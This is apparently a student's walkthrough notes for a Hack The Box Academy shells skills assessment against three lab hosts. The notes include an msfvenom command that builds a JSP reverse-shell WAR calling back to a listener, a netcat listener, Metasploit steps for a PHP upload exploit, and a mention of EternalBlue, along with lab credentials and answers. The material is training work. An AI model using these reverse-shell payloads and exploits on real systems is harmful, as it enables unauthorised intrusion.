
CAT5's team has secured a foothold into Inlanefreight's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.
## Objectives:

- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.
## Credentials and Other Needed Info:

Foothold:

- IP: 10.129.204.126 (ACADEMY-SHELLS-SKILLS-FOOTHOLD)
- Credentials: `htb-student` / HTB_@cademy_stdnt! Can be used by RDP.

Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.0.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

# 3 Host and 6 Goals
3x Targets
Host: 01 = 172.16.1.11:8080
Host: 02 = blog.inlanefreight.local
Host: 03 = 172.16.1.13
### Host 1
1. What is the hostname of Host-1? (Format: all lower case)
2. Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

`nmap -sC -sV -O 172.16.1.11`
![[Pasted image 20260117194410.png]]
From this the Domain/host is SHELLS-winsvr
And a port 8080 for Apache Tomcat 10.0.11

Looking into the tomcat apache...seems like a vector of a .war file.
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war`
And run a netcat listener!
`sudo nc -lvnp 443`
From the tomcat apache page you can upload a war file.
Once done you can navigate to the Share directory and find the dev-share.

### Host 2
What distribution of Linux is running on Host-2? (Format: distro name, all lower case)
What language is the shell written in that gets uploaded when using the 50064.rb exploit?

First since we have the website of `blog.inlanefreight.local`
Use `nslookup blog.inlanefreight.local`
This gave us 172.16.1.12

Now `nmap`
`nmap -sC -sV 172.16.1.12 -O`
From this it is running on an ubuntu machine

Doing some enumeration of the website and looking at the post the 50064.rb exploit is based on PHP

![[Pasted image 20260127184700.png]]
```shell
run msfconsole

run reload_all

use exploit/50064.rb

view options
```
set the correct options of the loadout and run

### Host 3
What is the Hostname
Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt


Since running the nmap command was able to grab the hostname and know its a windows server of 2017, vulnerable to eternal blue.
![[Pasted image 20260127190512.png]]
